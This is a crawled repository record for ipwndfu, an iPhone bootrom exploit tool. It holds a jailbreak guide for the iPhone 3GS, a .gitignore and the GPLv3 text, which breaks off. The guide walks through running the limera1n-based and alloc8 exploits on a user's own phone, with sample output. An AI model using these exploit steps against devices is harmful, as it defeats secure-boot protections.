{
  "metadata": {
    "timestamp": 1736560705041,
    "page": 366,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM3MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "axi0mX/ipwndfu",
      "stars": 7123,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0849609375,
          "content": "*.pyc\nnor-backups/nor-*\nlibusbfinder/libusb-*\nSecureROM-*\nn88ap-iBSS-4.3.5.img3\n*.ipsw\n"
        },
        {
          "name": "JAILBREAK-GUIDE.md",
          "type": "blob",
          "size": 5.912109375,
          "content": "# Jailbreak guide for iPhone 3GS (new bootrom)\n\n### Steps\n\n1. Backup your data. Everything will be removed from your phone as it is a **full** restore.\n\n2. [Generate a custom 24Kpwn IPSW for iPhone 3GS (old bootrom)](#how-to-create-a-24kpwn-ipsw).\n\n3. [Restore to this custom IPSW on your iPhone 3GS (new bootrom)](#how-to-restore-to-a-custom-ipsw).\n\n4. After restore is complete, your phone will connect back to your computer in DFU Mode. The screen will be black. This is expected. 24Kpwn exploit does not work on iPhone 3GS (new bootrom).\n\n5. Use ipwndfu to put your device into pwned DFU Mode:\n\n```\n$ ./ipwndfu -p\n*** based on limera1n exploit (heap overflow) by geohot ***\nFound: CPID:8920 CPRV:15 CPFM:03 SCEP:03 BDID:00 ECID:XXXXXXXXXXXXXXXX SRTG:[iBoot-359.3.2]\nDevice is now in pwned DFU Mode.\n```\n\n6. Once in pwned DFU Mode, use the -x flag to install the alloc8 exploit. This step will replace 24Kpwn exploit with alloc8.\n\n```\n$ ./ipwndfu -x\nInstalling alloc8 exploit to NOR.\nDumping NOR, part 1/8.\nDumping NOR, part 2/8.\nDumping NOR, part 3/8.\nDumping NOR, part 4/8.\nDumping NOR, part 5/8.\nDumping NOR, part 6/8.\nDumping NOR, part 7/8.\nDumping NOR, part 8/8.\nNOR backed up to file: nor-backups/nor-XXXXXXXXXXXXXXXX-20170409-224258.dump\nSending iBSS.\nWaiting for iBSS to enter Recovery Mode.\nSending iBSS payload to flash NOR.\nSending run command.\nIf screen is not red, NOR was flashed successfully and device will reboot.\n```\n\n#### Notes:\n* Installation takes about 30 seconds. Once NOR is being flashed, the screen will be green for about 10 seconds, and then your phone will reboot.\n\n* If there are any errors before the screen turned green, it is safe to try again.\n\n* If the screen turns red, something went wrong while your phone was being flashed. Trying again probably won't help.\n\n* If there are no issues, the phone will reboot and automatically boot into iOS.\n\n\n\n\n\n### 3 second delay during boot when using a phone jailbroken with alloc8\n\nalloc8 exploit takes about 3 seconds to run.\n\nWhen your phone is off, to turn it on you will need to keep holding the Power button for at least 3 seconds, or your phone will not turn on. This might be because LLB protects against accidental presses of the Power button by shutting down the phone if the power button is not being held anymore. Without an exploit it takes less than a second before this check happens, but with alloc8 exploit it will happen after about 3 seconds. It might be possible to change this behavior by patching LLB.\n\nIf your phone enters deep sleep, there will be a 3 second delay before it wakes up. This can be fixed if you disable deep sleep with a tweak from Cydia, but your phone's battery life will decrease.\n\n\n### Where to download older IPSWs\n\nAlways download IPSWs directly from Apple, because IPSWs from other sites could be infected with malware.\n\nThere is a trusted site where you can find legitimate Apple download links for older IPSW files:\n\nhttps://ipsw.me/\n\n\n### How to create a 24Kpwn IPSW\n\n| iOS version | Tool                                                                                            |\n|-------------|-------------------------------------------------------------------------------------------------|\n| iOS 3.1     | [PwnageTool 3.1.3](https://github.com/axi0mX/PwnageTool-mirror/raw/master/PwnageTool_3.1.3.dmg) |\n| iOS 3.1.2   | [PwnageTool 3.1.5](https://github.com/axi0mX/PwnageTool-mirror/raw/master/PwnageTool_3.1.5.dmg) |\n| iOS 3.1.3   | [PwnageTool 3.1.5](https://github.com/axi0mX/PwnageTool-mirror/raw/master/PwnageTool_3.1.5.dmg) |\n| iOS 4.0     | [PwnageTool 4.01](https://github.com/axi0mX/PwnageTool-mirror/raw/master/PwnageTool_4.01.dmg)   |\n| iOS 4.3.3   | [redsn0w 0.9.15 beta 3](http://www.iphonehacks.com/download-redsn0w)                            |\n| iOS 5.0     | [redsn0w 0.9.15 beta 3](http://www.iphonehacks.com/download-redsn0w)                            |\n| iOS 5.0.1   | [redsn0w 0.9.15 beta 3](http://www.iphonehacks.com/download-redsn0w)                            |\n| iOS 5.1     | [redsn0w 0.9.15 beta 3](http://www.iphonehacks.com/download-redsn0w)                            |\n| iOS 5.1.1   | [redsn0w 0.9.15 beta 3](http://www.iphonehacks.com/download-redsn0w)                            |\n\n#### Notes on using redsn0w 0.9.15b3\n\n```\nQ: Will this custom IPSW be used on a newer (fixed) version of the iPhone3GS?\nA: No\n```\n\nYou must answer No to create a 24Kpwn IPSW using redsn0w. If you did this correctly, the name of the custom IPSW from redsn0w will start with ```NO_BB_OLDROM_iPhone2,1```.\n\n\n### Compatibility with older iOS versions\n\nNewer phones might not support some older versions of iOS. You cannot brick your phone by attempting to restore an older version of iOS, so it might be worth it to try anyway. If iTunes restore fails with Error 28, the hardware of your phone is not compatible with that version of iOS.\n\n| Manufactured | Error 28   | Success    |\n|--------------|------------|------------|\n| Week 38 2010 | N/A        | 3.1+       |\n| Week 48 2010 | N/A        | 3.1+       |\n| Week  3 2011 | 3.x        | 4.3.3+     |\n| Week 14 2011 | 3.x        | 4.0+       |\n| Week 23 2011 | N/A        | 3.1.2+     |\n| Week 29 2011 | 3.x        | 4.0+       |\n| Week 36 2011 | 3.x        | 4.0+       |\n| Week 26 2012 | 3.x, 4.x   | 5.0+       |\n\nYou can find the week and year of manufacture by looking at the serial number of your phone. If your phone is from 2011 or 2012, help me expand this list and let me what versions worked or didn't work.\n\n\n### Decoding iPhone 3GS serial number\n\n```\nSerial number: AABCCDDDEE\nAA = Device ID\nB = 2009=9, 2010=0, 2011=1, 2012=2\nCC = Week of production\nDDD = Unique ID\nEE = Color\n```\n\n\n### How to restore to a custom IPSW\n\n1. Enter DFU Mode: https://www.theiphonewiki.com/wiki/DFU_Mode\n\n2. Run exploit to put your phone into pwned DFU Mode. You can use `./ipwndfu -p`.\n\n3. Any version of iTunes should work. In iTunes, hold Option (or SHIFT if using Windows) and click Restore. You should be prompted to choose a file. Choose your custom IPSW.\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3173828125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    {one line to give the program's name and a brief idea of what it does.}\n    Copyright (C) {year}  {name of author}\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    {project}  Copyright (C) {year}  {fullname}\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the 